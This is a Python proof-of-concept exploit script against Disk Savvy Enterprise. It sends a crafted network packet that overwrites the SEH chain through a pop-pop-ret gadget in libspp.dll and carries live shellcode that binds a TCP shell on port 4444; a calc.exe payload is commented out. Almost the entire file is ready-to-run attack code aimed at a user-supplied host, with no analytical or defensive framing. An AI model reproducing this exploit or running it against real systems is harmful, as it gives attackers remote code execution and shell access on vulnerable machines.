#!/usr/bin/env python

import sys
import socket
#from time import sleep
from struct import pack

if len(sys.argv) < 3:
  print "Usage: diskSavvy-PoC.py <target> <port>"
  sys.exit(1)

host = sys.argv[1]
port = sys.argv[2]

# SEH Overwrite at 128 bytes
#
# Log data, item 21
# Address=10056DA4
# Message=  0x10056da4 : pop ebx # pop ecx # ret 0x20 |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Disk Savvy Enterprise\bin\libspp.dll)

payload = "\x41"*124
payload += "\xEB\x0F\x90\x90"
payload += "\xA4\x6D\x05\x10"
payload += "\x90"*10
payload += "\x83\xC4\x34"	# ADD ESP,34 (stack adjust)
payload += "\xFF\x24\x24" 	# JMP DWORD PTR SS:[ESP]
payload += "\x41"* 112		# Buffer padding
'''
# Calc.exe
payload += "\xda\xca\xba\x3d\x24\x6c\x5a\xd9\x74\x24\xf4\x58\x31"
payload += "\xc9\xb1\x31\x31\x50\x18\x83\xc0\x04\x03\x50\x29\xc6"
payload += "\x99\xa6\xb9\x84\x62\x57\x39\xe9\xeb\xb2\x08\x29\x8f"
payload += "\xb7\x3a\x99\xdb\x9a\xb6\x52\x89\x0e\x4d\x16\x06\x20"
payload += "\xe6\x9d\x70\x0f\xf7\x8e\x41\x0e\x7b\xcd\x95\xf0\x42"
payload += "\x1e\xe8\xf1\x83\x43\x01\xa3\x5c\x0f\xb4\x54\xe9\x45"
payload += "\x05\xde\xa1\x48\x0d\x03\x71\x6a\x3c\x92\x0a\x35\x9e"
payload += "\x14\xdf\x4d\x97\x0e\x3c\x6b\x61\xa4\xf6\x07\x70\x6c"
payload += "\xc7\xe8\xdf\x51\xe8\x1a\x21\x95\xce\xc4\x54\xef\x2d"
payload += "\x78\x6f\x34\x4c\xa6\xfa\xaf\xf6\x2d\x5c\x14\x07\xe1"
payload += "\x3b\xdf\x0b\x4e\x4f\x87\x0f\x51\x9c\xb3\x2b\xda\x23"
payload += "\x14\xba\x98\x07\xb0\xe7\x7b\x29\xe1\x4d\x2d\x56\xf1"
payload += "\x2e\x92\xf2\x79\xc2\xc7\x8e\x23\x88\x16\x1c\x5e\xfe"
payload += "\x19\x1e\x61\xae\x71\x2f\xea\x21\x05\xb0\x39\x06\xf9"
payload += "\xfa\x60\x2e\x92\xa2\xf0\x73\xff\x54\x2f\xb7\x06\xd7"
payload += "\xda\x47\xfd\xc7\xae\x42\xb9\x4f\x42\x3e\xd2\x25\x64"
payload += "\xed\xd3\x6f\x07\x70\x40\xf3\xe6\x17\xe0\x96\xf6"
'''
# Bind TCP 4444
payload += "\xdb\xc0\xba\x1a\x92\xda\x10\xd9\x74\x24\xf4\x58\x31"
payload += "\xc9\xb1\x53\x83\xe8\xfc\x31\x50\x13\x03\x4a\x81\x38"
payload += "\xe5\x96\x4d\x3e\x06\x66\x8e\x5f\x8e\x83\xbf\x5f\xf4"
payload += "\xc0\x90\x6f\x7e\x84\x1c\x1b\xd2\x3c\x96\x69\xfb\x33"
payload += "\x1f\xc7\xdd\x7a\xa0\x74\x1d\x1d\x22\x87\x72\xfd\x1b"
payload += "\x48\x87\xfc\x5c\xb5\x6a\xac\x35\xb1\xd9\x40\x31\x8f"
payload += "\xe1\xeb\x09\x01\x62\x08\xd9\x20\x43\x9f\x51\x7b\x43"
payload += "\x1e\xb5\xf7\xca\x38\xda\x32\x84\xb3\x28\xc8\x17\x15"
payload += "\x61\x31\xbb\x58\x4d\xc0\xc5\x9d\x6a\x3b\xb0\xd7\x88"
payload += "\xc6\xc3\x2c\xf2\x1c\x41\xb6\x54\xd6\xf1\x12\x64\x3b"
payload += "\x67\xd1\x6a\xf0\xe3\xbd\x6e\x07\x27\xb6\x8b\x8c\xc6"
payload += "\x18\x1a\xd6\xec\xbc\x46\x8c\x8d\xe5\x22\x63\xb1\xf5"
payload += "\x8c\xdc\x17\x7e\x20\x08\x2a\xdd\x2d\xfd\x07\xdd\xad"
payload += "\x69\x1f\xae\x9f\x36\x8b\x38\xac\xbf\x15\xbf\xd3\x95"
payload += "\xe2\x2f\x2a\x16\x13\x66\xe9\x42\x43\x10\xd8\xea\x08"
payload += "\xe0\xe5\x3e\xa4\xe8\x40\x91\xdb\x15\x32\x41\x5c\xb5"
payload += "\xdb\x8b\x53\xea\xfc\xb3\xb9\x83\x95\x49\x42\xba\x39"
payload += "\xc7\xa4\xd6\xd1\x81\x7f\x4e\x10\xf6\xb7\xe9\x6b\xdc"
payload += "\xef\x9d\x24\x36\x37\xa2\xb4\x1c\x1f\x34\x3f\x73\x9b"
payload += "\x25\x40\x5e\x8b\x32\xd7\x14\x5a\x71\x49\x28\x77\xe1"
payload += "\xea\xbb\x1c\xf1\x65\xa0\x8a\xa6\x22\x16\xc3\x22\xdf"
payload += "\x01\x7d\x50\x22\xd7\x46\xd0\xf9\x24\x48\xd9\x8c\x11"
payload += "\x6e\xc9\x48\x99\x2a\xbd\x04\xcc\xe4\x6b\xe3\xa6\x46"
payload += "\xc5\xbd\x15\x01\x81\x38\x56\x92\xd7\x44\xb3\x64\x37"
payload += "\xf4\x6a\x31\x48\x39\xfb\xb5\x31\x27\x9b\x3a\xe8\xe3"
payload += "\xab\x70\xb0\x42\x24\xdd\x21\xd7\x29\xde\x9c\x14\x54"
payload += "\x5d\x14\xe5\xa3\x7d\x5d\xe0\xe8\x39\x8e\x98\x61\xac"
payload += "\xb0\x0f\x81\xe5"

payload += "\x43"*(1500 - len(payload))

header =  "\x75\x19\xba\xab"
header += "\x03\x00\x00\x00"
header += "\x00\x40\x00\x00"
header += pack('<I', len(payload))
header += pack('<I', len(payload))
header += pack('<I', ord(payload[-1]))

packet = header + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  print "[*] Testing connection to target %s:%s" %(host,port)
  s.connect((host, int(port)))
  
except:
  print "[-] Unable to communicate to target %s:%s" %(host,port)
  sys.exit(1)

s.send(packet)
print "[+] Sent %s" %(packet)
